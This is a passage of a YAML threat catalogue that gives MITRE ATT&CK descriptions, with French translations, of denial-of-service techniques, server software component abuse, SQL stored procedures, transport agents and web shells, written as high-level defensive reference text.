      Reflection attacks often take advantage of protocols with larger responses than
      requests in order to amplify their traffic, commonly known as a Reflection Amplification
      attack. Adversaries may be able to generate an increase in volume of attack
      traffic that is several orders of magnitude greater than the requests sent to
      the amplifiers. The extent of this increase will depending upon many variables,
      such as the protocol in question, the technique used, and the amplifying servers
      that actually produce the amplification in attack volume. Two prominent protocols
      that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare
      DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though
      the use of several others in the wild have been documented.(Citation: Arbor
      AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself
      to be a powerful protocol, with amplification sizes up to 51,200 times the requesting
      packet.(Citation: Cloudflare Memcrashed Feb 2018)

      https://attack.mitre.org/techniques/T1498/002'
    translations:
      fr:
        name: "Amplification par r\xE9flexion"
        description: "Les adversaires peuvent tenter de provoquer un d\xE9ni de service\
          \ (DoS) en refl\xE9tant un volume \xE9lev\xE9 de trafic r\xE9seau vers une\
          \ cible. Ce type de DoS r\xE9seau exploite un interm\xE9diaire serveur tiers\
          \ qui h\xE9berge et r\xE9pond \xE0 une adresse IP source usurp\xE9e donn\xE9\
          e. Ce serveur tiers est commun\xE9ment appel\xE9 un r\xE9flecteur. Un adversaire\
          \ r\xE9alise une attaque de r\xE9flexion en envoyant des paquets aux r\xE9\
          flecteurs contenant l\u2019adresse usurpante de la victime. \xC0 l\u2019\
          instar des inondations directes de r\xE9seau, plusieurs syst\xE8mes peuvent\
          \ \xEAtre utilis\xE9s pour mener l\u2019attaque, ou un botnet peut \xEA\
          tre utilis\xE9. De m\xEAme, un ou plusieurs r\xE9flecteurs peuvent \xEA\
          tre utilis\xE9s pour concentrer le trafic sur la cible. (Citation : R\xE9\
          flexion Cloudflare DoS mai 2017) Cette attaque DoS r\xE9seau peut \xE9galement\
          \ r\xE9duire la disponibilit\xE9 et la fonctionnalit\xE9 du ou des syst\xE8\
          mes et du r\xE9seau cibl\xE9.\n\nLes attaques par r\xE9flexion exploitent\
          \ souvent des protocoles avec des r\xE9ponses plus importantes que les requ\xEA\
          tes afin d\u2019amplifier leur traffic, commun\xE9ment appel\xE9 attaque\
          \ par amplification de r\xE9flexion. Les adversaires peuvent g\xE9n\xE9\
          rer une augmentation du volume de trafic d\u2019attaque plusieurs ordres\
          \ de grandeur sup\xE9rieure aux requ\xEAtes envoy\xE9es aux amplificateurs.\
          \ L\u2019ampleur de cette augmentation d\xE9pendra de nombreuses variables,\
          \ telles que le protocole en question, la technique utilis\xE9e, et les\
          \ serveurs d\u2019amplification qui produisent effectivement l\u2019amplification\
          \ en volume d\u2019attaque. Deux protocoles majeurs qui ont permis les inondations\
          \ d\u2019amplification par r\xE9flexion sont DNS (Citation : Cloudflare\
          \ DNSamplificationDoS) et NTP (Citation : Cloudflare NTPamplifciationDoS),\
          \ bien que l\u2019utilisation de plusieurs autres dans la nature ait \xE9\
          t\xE9 document\xE9e. (Citation : Arbor AnnualDoSreport janvier 2018)  En\
          \ particulier, le protocole memcache s\u2019est r\xE9v\xE9l\xE9 puissant,\
          \ avec des tailles d\u2019amplification allant jusqu\u2019\xE0 51 200 fois\
          \ le paquet demandant. (Citation : Cloudflare M\xE9mcrash\xE9 f\xE9vrier\
          \ 2018)\nhttps://attack.mitre.org/techniques/T1498/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499
    ref_id: T1499
    name: Endpoint Denial of Service
    description: 'Adversaries may perform Endpoint Denial of Service (DoS) attacks
      to degrade or block the availability of services to users. Endpoint DoS can
      be performed by exhausting the system resources those services are hosted on
      or exploiting the system to cause a persistent crash condition. Example services
      include websites, email services, DNS, and web-based applications. Adversaries
      have been observed conducting DoS attacks for political purposes(Citation: FireEye
      OpPoisonedHandover February 2016) and to support other malicious activities,
      including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism,
      and extortion.(Citation: Symantec DDoS October 2014)


      An Endpoint DoS denies the availability of a service without saturating the
      network used to provide access to the service. Adversaries can target various
      layers of the application stack that is hosted on the system used to provide
      the service. These layers include the Operating Systems (OS), server applications
      such as web servers, DNS servers, databases, and the (typically web-based) applications
      that sit on top of them. Attacking each layer requires different techniques
      that take advantage of bottlenecks that are unique to the respective components.
      A DoS attack may be generated by a single system or multiple systems spread
      across the internet, which is commonly referred to as a distributed DoS (DDoS).


      To perform DoS attacks against endpoint resources, several aspects apply to
      multiple methods, including IP address spoofing and botnets.


      Adversaries may use the original IP address of an attacking system, or spoof
      the source IP address to make the attack traffic more difficult to trace back
      to the attacking system or to enable reflection. This can increase the difficulty
      defenders have in defending against the attack by reducing or eliminating the
      effectiveness of filtering by the source address on network defense devices.


      Botnets are commonly used to conduct DDoS attacks against networks and services.
      Large botnets can generate a significant amount of traffic from systems spread
      across the global internet. Adversaries may have the resources to build out
      and control their own botnet infrastructure or may rent time on an existing
      botnet to conduct an attack. In some of the worst cases for DDoS, so many systems
      are used to generate requests that each one only needs to send out a small amount
      of traffic to produce enough volume to exhaust the target''s resources. In such
      circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly
      difficult. Botnets have been used in some of the most high-profile DDoS attacks,
      such as the 2012 series of incidents that targeted major US banks.(Citation:
      USNYAG IranianBotnet March 2016)


      In cases where traffic manipulation is used, there may be points in the global
      network (such as high traffic gateway routers) where packets can be altered
      and cause legitimate clients to execute code that directs network packets toward
      a target in high volume. This type of capability was previously used for the
      purposes of web censorship where client HTTP traffic was modified to include
      a reference to JavaScript that generated the DDoS code to overwhelm target web
      servers.(Citation: ArsTechnica Great Firewall of China)


      For attacks attempting to saturate the providing network, see [Network Denial
      of Service](https://attack.mitre.org/techniques/T1498).

      https://attack.mitre.org/techniques/T1499'
    translations:
      fr:
        name: Refus de service sur les points de terminaison
        description: "Les attaquants peuvent mener des attaques par d\xE9ni de service\
          \ (DoS) au niveau des terminaux afin de r\xE9duire ou de bloquer la disponibilit\xE9\
          \ des services pour les utilisateurs. Une attaque DoS au niveau des terminaux\
          \ peut \xEAtre r\xE9alis\xE9e en \xE9puisant les ressources syst\xE8me sur\
          \ lesquelles ces services sont h\xE9berg\xE9s ou en exploitant le syst\xE8\
          me pour provoquer un plantage persistant. Parmi les services concern\xE9\
          s, on peut citer les sites web, les services de messagerie \xE9lectronique,\
          \ le DNS et les applications web. On a observ\xE9 des attaquants mener des\
          \ attaques DoS \xE0 des fins politiques (R\xE9f\xE9rence : FireEye OpPoisonedHandover,\
          \ f\xE9vrier 2016) et pour soutenir d\u2019autres activit\xE9s malveillantes,\
          \ notamment la diversion (R\xE9f\xE9rence : FSISAC FraudNetDoS, septembre\
          \ 2012), le hacktivisme et l\u2019extorsion (R\xE9f\xE9rence : Symantec\
          \ DDoS, octobre 2014).\n\nUne attaque DoS au niveau des terminaux emp\xEA\
          che la disponibilit\xE9 d\u2019un service sans saturer le r\xE9seau utilis\xE9\
          \ pour y acc\xE9der. Les attaquants peuvent cibler diff\xE9rentes couches\
          \ de la pile applicative h\xE9berg\xE9e sur le syst\xE8me utilis\xE9 pour\
          \ fournir le service. Ces couches comprennent les syst\xE8mes d\u2019exploitation\
          \ (OS), les applications serveur telles que les serveurs web, les serveurs\
          \ DNS, les bases de donn\xE9es et les applications (g\xE9n\xE9ralement web)\
          \ qui s\u2019appuient sur celles-ci. L'attaque de chaque couche n\xE9cessite\
          \ des techniques diff\xE9rentes qui exploitent les goulots d'\xE9tranglement\
          \ propres \xE0 chaque composant. Une attaque DoS peut \xEAtre g\xE9n\xE9\
          r\xE9e par un seul syst\xE8me ou par plusieurs syst\xE8mes r\xE9partis sur\
          \ Internet, ce que l'on appelle commun\xE9ment une attaque DoS distribu\xE9\
          e (DDoS).\n\nPour mener des attaques par d\xE9ni de service (DoS) contre\
          \ des ressources en p\xE9riph\xE9rie, plusieurs aspects s'appliquent \xE0\
          \ diverses m\xE9thodes, notamment l'usurpation d'adresse IP et les botnets.\n\
          \nLes attaquants peuvent utiliser l\u2019adresse IP d\u2019origine d\u2019\
          un syst\xE8me attaquant, ou usurper l\u2019adresse IP source afin de rendre\
          \ le trafic d\u2019attaque plus difficile \xE0 remonter jusqu\u2019au syst\xE8\
          me attaquant ou pour permettre la r\xE9flexion. Cela peut compliquer la\
          \ t\xE2che des d\xE9fenseurs face \xE0 l\u2019attaque en r\xE9duisant, voire\
          \ en \xE9liminant, l\u2019efficacit\xE9 du filtrage par adresse source sur\
          \ les dispositifs de d\xE9fense r\xE9seau.\n\nLes botnets sont couramment\
          \ utilis\xE9s pour mener des attaques DDoS contre des r\xE9seaux et des\
          \ services. Les grands botnets peuvent g\xE9n\xE9rer un volume de trafic\
          \ consid\xE9rable \xE0 partir de syst\xE8mes r\xE9partis sur l\u2019ensemble\
          \ de l\u2019Internet mondial. Les attaquants peuvent disposer des ressources\
          \ n\xE9cessaires pour mettre en place et contr\xF4ler leur propre infrastructure\
          \ de botnet, ou louer du temps sur un botnet existant pour mener une attaque.\
          \ Dans certains des pires cas de DDoS, un si grand nombre de syst\xE8mes\
          \ sont utilis\xE9s pour g\xE9n\xE9rer des requ\xEAtes que chacun d\u2019\
          entre eux n\u2019a besoin d\u2019envoyer qu\u2019une faible quantit\xE9\
          \ de trafic pour produire un volume suffisant \xE0 \xE9puiser les ressources\
          \ de la cible. Dans de telles circonstances, il devient extr\xEAmement difficile\
          \ de distinguer le trafic DDoS de celui provenant de clients l\xE9gitimes.\
          \ Les botnets ont \xE9t\xE9 utilis\xE9s dans certaines des attaques DDoS\
          \ les plus m\xE9diatis\xE9es, telles que la s\xE9rie d\u2019incidents de\
          \ 2012 qui a vis\xE9 de grandes banques am\xE9ricaines. (R\xE9f\xE9rence\
          \ : USNYAG IranianBotnet, mars 2016)\n\nLorsque des techniques de manipulation\
          \ du trafic sont utilis\xE9es, il peut exister des points au sein du r\xE9\
          seau mondial (tels que des routeurs de passerelle \xE0 fort trafic) o\xF9\
          \ les paquets peuvent \xEAtre alt\xE9r\xE9s et amener des clients l\xE9\
          gitimes \xE0 ex\xE9cuter du code redirigeant des paquets r\xE9seau vers\
          \ une cible en grand nombre. Ce type de technique \xE9tait auparavant utilis\xE9\
          \ \xE0 des fins de censure sur le Web : le trafic HTTP des clients \xE9\
          tait modifi\xE9 pour inclure une r\xE9f\xE9rence \xE0 du code JavaScript\
          \ g\xE9n\xE9rant le code DDoS destin\xE9 \xE0 saturer les serveurs Web cibles.\
          \ (R\xE9f\xE9rence : ArsTechnica, \xAB Great Firewall of China \xBB)\n\n\
          Pour les attaques visant \xE0 saturer le r\xE9seau fournisseur, voir [D\xE9\
          ni de service r\xE9seau](https://attack.mitre.org/techniques/T1498).\nhttps://attack.mitre.org/techniques/T1499"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.001
    ref_id: T1499.001
    name: OS Exhaustion Flood
    description: 'Adversaries may launch a denial of service (DoS) attack targeting
      an endpoint''s operating system (OS). A system''s OS is responsible for managing
      the finite resources as well as preventing the entire system from being overwhelmed
      by excessive demands on its capacity. These attacks do not need to exhaust the
      actual resources on a system; the attacks may simply exhaust the limits and
      available resources that an OS self-imposes.


      Different ways to achieve this exist, including TCP state-exhaustion attacks
      such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)
      With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP
      handshake is never completed. Because each OS has a maximum number of concurrent
      TCP connections that it will allow, this can quickly exhaust the ability of
      the system to receive new requests for TCP connections, thus preventing access
      to any TCP service provided by the server.(Citation: Cloudflare SynFlood)


      ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK
      packets are sent to the target. This forces the OS to search its state table
      for a related TCP connection that has already been established. Because the
      ACK packets are for connections that do not exist, the OS will have to search
      the entire state table to confirm that no match exists. When it is necessary
      to do this for a large flood of packets, the computational requirements can
      cause the server to become sluggish and/or unresponsive, due to the work it
      must do to eliminate the rogue ACK packets. This greatly reduces the resources
      available for providing the targeted service.(Citation: Corero SYN-ACKflood)

      https://attack.mitre.org/techniques/T1499/001'
    translations:
      fr:
        name: "Inondation d\u2019\xE9puisement du syst\xE8me d\u2019exploitation"
        description: "Les adversaires peuvent lancer une attaque par d\xE9ni de service\
          \ (DoS) visant le syst\xE8me d\u2019exploitation (OS) d\u2019un point de\
          \ terminaison. Le syst\xE8me d\u2019exploitation d\u2019un syst\xE8me est\
          \ responsable de la gestion des ressources finies ainsi que de l\u2019emp\xEA\
          chement que l\u2019ensemble du syst\xE8me soit submerg\xE9 par des exigences\
          \ excessives sur sa capacit\xE9. Ces attaques n\u2019ont pas besoin d\u2019\
          \xE9puiser les ressources r\xE9elles d\u2019un syst\xE8me ; les attaques\
          \ peuvent simplement \xE9puiser les limites et les ressources disponibles\
          \ qu\u2019un syst\xE8me d\u2019exploitation s\u2019impose lui-m\xEAme.\n\
          \nDiff\xE9rentes fa\xE7ons d\u2019y parvenir existent, notamment des attaques\
          \ d\u2019\xE9puisement d\u2019\xE9tat TCP telles que les inondations SYN\
          \ et les inondations ACK. (Citation : Arbor AnnualDoSreport janvier 2018)\
          \ Avec les inondations SYN, des quantit\xE9s excessives de paquets SYN sont\
          \ envoy\xE9es, mais la n\xE9gociation TCP \xE0 3 voies n\u2019est jamais\
          \ achev\xE9e. Parce que chaque syst\xE8me d\u2019exploitation dispose d\u2019\
          un nombre maximal de connexions TCP simultan\xE9es autoris\xE9es, cela peut\
          \ rapidement \xE9puiser la capacit\xE9 du syst\xE8me \xE0 recevoir de nouvelles\
          \ requ\xEAtes pour les connexions TCP, emp\xEAchant ainsi l\u2019acc\xE8\
          s \xE0 tout service TCP fourni par le serveur. (Citation : Cloudflare SynFlood)\n\
          \nLes inondations ACK tirent parti de la nature \xE9tatique du protocole\
          \ TCP. Un flot de paquets ACK est envoy\xE9 \xE0 la cible. Cela oblige le\
          \ syst\xE8me d\u2019exploitation \xE0 rechercher dans sa table d\u2019\xE9\
          tat une connexion TCP li\xE9e d\xE9j\xE0 \xE9tablie. Comme les paquets ACK\
          \ concernent des connexions qui n\u2019existent pas, le syst\xE8me d\u2019\
          exploitation devra rechercher toute la table d\u2019\xE9tat pour confirmer\
          \ qu\u2019aucune correspondance n\u2019existe. Lorsqu\u2019il est n\xE9\
          cessaire de faire cela pour un grand flot de paquets, les exigences de calcul\
          \ peuvent rendre le serveur lent et/ou non r\xE9actif, en raison du travail\
          \ n\xE9cessaire pour \xE9liminer les paquets ACK malveillants. Cela r\xE9\
          duit consid\xE9rablement les ressources disponibles pour fournir le service\
          \ cibl\xE9. (Citation : Corero SYN-ACKflood)\nhttps://attack.mitre.org/techniques/T1499/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.002
    ref_id: T1499.002
    name: Service Exhaustion Flood
    description: 'Adversaries may target the different network services provided by
      systems to conduct a denial of service (DoS). Adversaries often target the availability
      of DNS and web services, however others have been targeted as well.(Citation:
      Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through
      a variety of means, some of which apply generally while others are specific
      to the software being used to provide the service.


      One example of this type of attack is known as a simple HTTP flood, where an
      adversary sends a large number of HTTP requests to a web server to overwhelm
      it and/or an application that runs on top of it. This flood relies on raw volume
      to accomplish the objective, exhausting any of the various resources required
      by the victim software to provide the service.(Citation: Cloudflare HTTPflood)


      Another variation, known as a SSL renegotiation attack, takes advantage of a
      protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms
      for the client and server to agree on an encryption algorithm to use for subsequent
      secure connections. If SSL renegotiation is enabled, a request can be made for
      renegotiation of the crypto algorithm. In a renegotiation attack, the adversary
      establishes a SSL/TLS connection and then proceeds to make a series of renegotiation
      requests. Because the cryptographic renegotiation has a meaningful cost in computation
      cycles, this can cause an impact to the availability of the service when done
      in volume.(Citation: Arbor SSLDoS April 2012)

      https://attack.mitre.org/techniques/T1499/002'
    translations:
      fr:
        name: "Inondation d\u2019\xE9puisement du service"
        description: "Les adversaires peuvent cibler les diff\xE9rents services r\xE9\
          seau fournis par les syst\xE8mes pour effectuer un d\xE9ni de service (DoS).\
          \ Les adversaires ciblent souvent la disponibilit\xE9 du DNS et des services\
          \ web, cependant d\u2019autres ont \xE9galement \xE9t\xE9 cibl\xE9s. (Citation\
          \ : Arbor AnnualDoSreport janvier 2018) Les logiciels de serveur web peuvent\
          \ \xEAtre attaqu\xE9s de diverses mani\xE8res, certaines s\u2019appliquent\
          \ g\xE9n\xE9ralement tandis que d\u2019autres sont sp\xE9cifiques au logiciel\
          \ utilis\xE9 pour fournir le service.\n\nUn exemple de ce type d\u2019attaque\
          \ est connu sous le nom de simple inondation HTTP, o\xF9 un adversaire envoie\
          \ un grand nombre de requ\xEAtes HTTP \xE0 un serveur web pour le submerger\
          \ et/ou \xE0 une application qui s\u2019ex\xE9cute dessus. Cette inondation\
          \ d\xE9pend du volume brut pour atteindre l\u2019objectif, \xE9puisant toutes\
          \ les diff\xE9rentes ressources n\xE9cessaires au logiciel victime pour\
          \ fournir le service. (Citation : Cloudflare HTTPflood)\n\nUne autre variante,\
          \ appel\xE9e attaque de ren\xE9gociation SSL, tire parti d\u2019une fonctionnalit\xE9\
          \ protocolaire dans SSL/TLS. La suite de protocoles SSL/TLS comprend des\
          \ m\xE9canismes permettant au client et au serveur de s\u2019entendre sur\
          \ un algorithme de chiffrement \xE0 utiliser pour les connexions s\xE9curis\xE9\
          es ult\xE9rieures. Si la ren\xE9gociation SSL est activ\xE9e, une demande\
          \ peut \xEAtre faite pour la ren\xE9gociation de l\u2019algorithme crypto.\
          \ Dans une attaque de ren\xE9gociation, l\u2019adversaire \xE9tablit une\
          \ connexion SSL/TLS puis proc\xE8de \xE0 une s\xE9rie de demandes de ren\xE9\
          gociation. Parce que la ren\xE9gociation cryptographique a un co\xFBt significatif\
          \ en cycles de calcul, cela peut avoir un impact sur la disponibilit\xE9\
          \ du service lorsqu\u2019elle est r\xE9alis\xE9e en volume. (Citation :\
          \ Arbor SSLDoS avril 2012)\nhttps://attack.mitre.org/techniques/T1499/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.003
    ref_id: T1499.003
    name: Application Exhaustion Flood
    description: 'Adversaries may target resource intensive features of applications
      to cause a denial of service (DoS), denying availability to those applications.
      For example, specific features in web applications may be highly resource intensive.
      Repeated requests to those features may be able to exhaust system resources
      and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport
      Jan 2018)

      https://attack.mitre.org/techniques/T1499/003'
    translations:
      fr:
        name: "Inondation d\u2019\xE9puisement de l\u2019application"
        description: "Les adversaires peuvent cibler des fonctionnalit\xE9s gourmandes\
          \ en ressources des applications pour provoquer un d\xE9ni de service (DoS),\
          \ refusant ainsi la disponibilit\xE9 de ces applications. Par exemple, certaines\
          \ fonctionnalit\xE9s dans les applications web peuvent \xEAtre tr\xE8s gourmandes\
          \ en ressources. Des requ\xEAtes r\xE9p\xE9t\xE9es sur ces fonctionnalit\xE9\
          s peuvent \xE9puiser les ressources du syst\xE8me et refuser l\u2019acc\xE8\
          s \xE0 l\u2019application ou au serveur lui-m\xEAme. (Citation : Arbor AnnualDoSreport\
          \ janvier 2018)\nhttps://attack.mitre.org/techniques/T1499/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.004
    ref_id: T1499.004
    name: Application or System Exploitation
    description: 'Adversaries may exploit software vulnerabilities that can cause
      an application or system to crash and deny availability to users. (Citation:
      Sucuri BIND9 August 2015) Some systems may automatically restart critical applications
      and services when crashes occur, but they can likely be re-exploited to cause
      a persistent denial of service (DoS) condition.


      Adversaries may exploit known or zero-day vulnerabilities to crash applications
      and/or systems, which may also lead to dependent applications and/or systems
      to be in a DoS condition. Crashed or restarted applications or systems may also
      have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485),
      [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489)
      etc. which may further cause a DoS condition and deny availability to critical
      information, applications and/or systems.

      https://attack.mitre.org/techniques/T1499/004'
    translations:
      fr:
        name: "Exploitation d\u2019applications ou de syst\xE8mes"
        description: "Les adversaires peuvent exploiter des vuln\xE9rabilit\xE9s logicielles\
          \ qui peuvent provoquer un plantage d\u2019une application ou d\u2019un\
          \ syst\xE8me et priver la disponibilit\xE9 des utilisateurs. (Citation :\
          \ Sucuri BIND9 ao\xFBt 2015) Certains syst\xE8mes peuvent red\xE9marrer\
          \ automatiquement des applications et services critiques en cas de plantage,\
          \ mais ils peuvent probablement \xEAtre r\xE9exploit\xE9s pour provoquer\
          \ une condition de d\xE9ni de service persistant (DoS).\n\nLes adversaires\
          \ peuvent exploiter des vuln\xE9rabilit\xE9s connues ou zero-day pour planter\
          \ des applications et/ou des syst\xE8mes, ce qui peut \xE9galement conduire\
          \ \xE0 des applications et/ou syst\xE8mes d\xE9pendants en \xE9tat DoS.\
          \ Des applications ou syst\xE8mes plant\xE9s ou red\xE9marr\xE9s peuvent\
          \ \xE9galement avoir d\u2019autres effets tels que [Destruction des donn\xE9\
          es](https://attack.mitre.org/techniques/T1485), [Corruption du firmware](https://attack.mitre.org/techniques/T1495),\
          \ [Arr\xEAt de service](https://attack.mitre.org/techniques/T1489), etc.,\
          \ ce qui peut aggraver une condition DoS et refuser la disponibilit\xE9\
          \ d\u2019informations, applications et/ou syst\xE8mes critiques.\nhttps://attack.mitre.org/techniques/T1499/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505
    ref_id: T1505
    name: Server Software Component
    description: 'Adversaries may abuse legitimate extensible development features
      of servers to establish persistent access to systems. Enterprise server applications
      may include features that allow developers to write and install software or
      scripts to extend the functionality of the main application. Adversaries may
      install malicious components to extend and abuse server applications.(Citation:
      volexity_0day_sophos_FW)

      https://attack.mitre.org/techniques/T1505'
    translations:
      fr:
        name: Composant logiciel serveur
        description: "Les adversaires peuvent abuser de fonctionnalit\xE9s de d\xE9\
          veloppement extensibles l\xE9gitimes des serveurs pour \xE9tablir un acc\xE8\
          s persistant aux syst\xE8mes. Les applications serveur d\u2019entreprise\
          \ peuvent inclure des fonctionnalit\xE9s permettant aux d\xE9veloppeurs\
          \ d\u2019\xE9crire et d\u2019installer des logiciels ou des scripts pour\
          \ \xE9tendre la fonctionnalit\xE9 de l\u2019application principale. Les\
          \ adversaires peuvent installer des composants malveillants pour \xE9tendre\
          \ et abuser des applications serveures. (Citation : volexity_0day_sophos_FW)\n\
          https://attack.mitre.org/techniques/T1505"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.001
    ref_id: T1505.001
    name: SQL Stored Procedures
    description: "Adversaries may abuse SQL stored procedures to establish persistent\
      \ access to systems. SQL Stored Procedures are code that can be saved and reused\
      \ so that database users do not waste time rewriting frequently used SQL queries.\
      \ Stored procedures can be invoked via SQL statements to the database using\
      \ the procedure name or via defined events (e.g. when a SQL server application\
      \ is started/restarted).\n\nAdversaries may craft malicious stored procedures\
      \ that can provide a persistence mechanism in SQL database servers.(Citation:\
      \ NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute\
      \ operating system commands through SQL syntax the adversary may have to enable\
      \ additional functionality, such as xp_cmdshell for MSSQL Server.(Citation:\
      \ NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation:\
      \ Microsoft xp_cmdshell 2017) \n\nMicrosoft SQL Server can enable common language\
      \ runtime (CLR) integration. With CLR integration enabled, application developers\
      \ can write stored procedures using any .NET framework language (e.g. VB .NET,\
      \ C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft\
      \ or modify CLR assemblies that are linked to stored procedures since these\
      \ CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI\
      \ SQL Server CLR)\nhttps://attack.mitre.org/techniques/T1505/001"
    translations:
      fr:
        name: "Proc\xE9dures SQL stock\xE9es"
        description: "Les adversaires peuvent abuser des proc\xE9dures SQL stock\xE9\
          es pour \xE9tablir un acc\xE8s persistant aux syst\xE8mes. Les proc\xE9\
          dures SQL stock\xE9es sont du code pouvant \xEAtre sauvegard\xE9 et r\xE9\
          utilis\xE9 afin que les utilisateurs de bases de donn\xE9es ne perdent pas\
          \ de temps \xE0 r\xE9\xE9crire les requ\xEAtes SQL fr\xE9quemment utilis\xE9\
          es. Les proc\xE9dures stock\xE9es peuvent \xEAtre invoqu\xE9es via des instructions\
          \ SQL \xE0 la base de donn\xE9es en utilisant le nom de proc\xE9dure ou\
          \ via des \xE9v\xE9nements d\xE9finis (par exemple lorsqu\u2019une application\
          \ SQL Server est lanc\xE9e/red\xE9marr\xE9e).\n\nLes adversaires peuvent\
          \ cr\xE9er des proc\xE9dures stock\xE9es malveillantes qui peuvent fournir\
          \ un m\xE9canisme de persistance dans les serveurs de bases de donn\xE9\
          es SQL. (Citation : Proc\xE9dures stock\xE9es de d\xE9marrage NetSPI)(Citation\
          \ : Kaspersky MSSQL ao\xFBt 2019) Pour ex\xE9cuter des commandes syst\xE8\
          me d\u2019exploitation via la syntaxe SQL, l\u2019adversaire peut devoir\
          \ activer des fonctionnalit\xE9s suppl\xE9mentaires, comme xp_cmdshell pour\
          \ MSSQL Server. (Citation : Proc\xE9dures stock\xE9es de d\xE9marrage NetSPI)(Citation\
          \ : Kaspersky MSSQL ao\xFBt 2019)(Citation : Microsoft xp_cmdshell 2017)\
          \ \n\nMicrosoft SQL Server peut permettre l\u2019int\xE9gration au temps\
          \ d\u2019ex\xE9cution en langage commun (CLR). Avec l\u2019int\xE9gration\
          \ CLR activ\xE9e, les d\xE9veloppeurs d\u2019applications peuvent \xE9crire\
          \ des proc\xE9dures stock\xE9es en utilisant n\u2019importe quel langage\
          \ de framework .NET (e.g. VB .NET, C#, etc.). (Citation : Int\xE9gration\
          \ Microsoft CLR 2017) Les adversaires peuvent cr\xE9er ou modifier des assemblages\
          \ CLR li\xE9s \xE0 des proc\xE9dures stock\xE9es, car ces assemblages peuvent\
          \ ex\xE9cuter des commandes arbitraires. (Citation : NetSPI SQL Server CLR)\n\
          https://attack.mitre.org/techniques/T1505/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.002
    ref_id: T1505.002
    name: Transport Agent
    description: "Adversaries may abuse Microsoft transport agents to establish persistent\
      \ access to systems. Microsoft Exchange transport agents can operate on email\
      \ messages passing through the transport pipeline to perform various tasks such\
      \ as filtering spam, filtering malicious attachments, journaling, or adding\
      \ a corporate signature to the end of all outgoing emails.(Citation: Microsoft\
      \ TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents\
      \ can be written by application developers and then compiled to .NET assemblies\
      \ that are subsequently registered with the Exchange server. Transport agents\
      \ will be invoked during a specified stage of email processing and carry out\
      \ developer defined tasks. \n\nAdversaries may register a malicious transport\
      \ agent to provide a persistence mechanism in Exchange Server that can be triggered\
      \ by adversary-specified email events.(Citation: ESET LightNeuron May 2019)\
      \ Though a malicious transport agent may be invoked for all emails passing through\
      \ the Exchange transport pipeline, the agent can be configured to only carry\
      \ out specific tasks in response to adversary defined criteria. For example,\
      \ the transport agent may only carry out an action like copying in-transit attachments\
      \ and saving them for later exfiltration if the recipient email address matches\
      \ an entry on a list provided by the adversary.\nhttps://attack.mitre.org/techniques/T1505/002"
    translations:
      fr:
        name: Transport Agent
        description: "Les adversaires peuvent abuser des agents de transport Microsoft\
          \ pour \xE9tablir un acc\xE8s persistant aux syst\xE8mes. Les agents de\
          \ transport Microsoft Exchange peuvent op\xE9rer sur les messages \xE9lectroniques\
          \ passant par le pipeline de transport pour effectuer diverses t\xE2ches\
          \ telles que filtrer le spam, les pi\xE8ces jointes malveillantes, tenir\
          \ un journal journalier ou ajouter une signature d\u2019entreprise \xE0\
          \ la fin de tous les e-mails sortants. (Citation : Microsoft TransportAgent\
          \ juin 2016)(Citation : ESET LightNeuron mai 2019) Les agents de transport\
          \ peuvent \xEAtre \xE9crits par les d\xE9veloppeurs d\u2019applications\
          \ puis compil\xE9s en assemblages .NET qui sont ensuite enregistr\xE9s sur\
          \ le serveur Exchange. Les agents de transport seront invoqu\xE9s lors d\u2019\
          une \xE9tape sp\xE9cifi\xE9e du traitement des e-mails et effectueront des\
          \ t\xE2ches d\xE9finies par les d\xE9veloppeurs. \n\nLes adversaires peuvent\
          \ enregistrer un agent de transport malveillant pour fournir un m\xE9canisme\
          \ de persistance dans Exchange Server qui peut \xEAtre d\xE9clench\xE9 par\
          \ des \xE9v\xE9nements email sp\xE9cifi\xE9s par l\u2019adversaire. (Citation\
          \ : ESET LightNeuron mai 2019) Bien qu\u2019un agent de transport malveillant\
          \ puisse \xEAtre invoqu\xE9 pour tous les emails passant par le pipeline\
          \ de transport Exchange, l\u2019agent peut \xEAtre configur\xE9 pour n\u2019\
          effectuer que des t\xE2ches sp\xE9cifiques en r\xE9ponse aux crit\xE8res\
          \ d\xE9finis par l\u2019adversaire. Par exemple, l\u2019agent de transport\
          \ ne peut effectuer une action comme copier des pi\xE8ces jointes en transit\
          \ et les sauvegarder pour une exfiltration ult\xE9rieure que si l\u2019\
          adresse email du destinataire correspond \xE0 une entr\xE9e d\u2019une liste\
          \ fournie par l\u2019adversaire.\nhttps://attack.mitre.org/techniques/T1505/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.003
    ref_id: T1505.003
    name: Web Shell
    description: 'Adversaries may backdoor web servers with web shells to establish
      persistent access to systems. A Web shell is a Web script that is placed on
      an openly accessible Web server to allow an adversary to access the Web server
      as a gateway into a network. A Web shell may provide a set of functions to execute
      or a command-line interface on the system that hosts the Web server.(Citation:
      volexity_0day_sophos_FW)


      In addition to a server-side script, a Web shell may have a client interface
      program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020)
      Web shell client).(Citation: Lee 2013)

      https://attack.mitre.org/techniques/T1505/003'
    translations:
      fr:
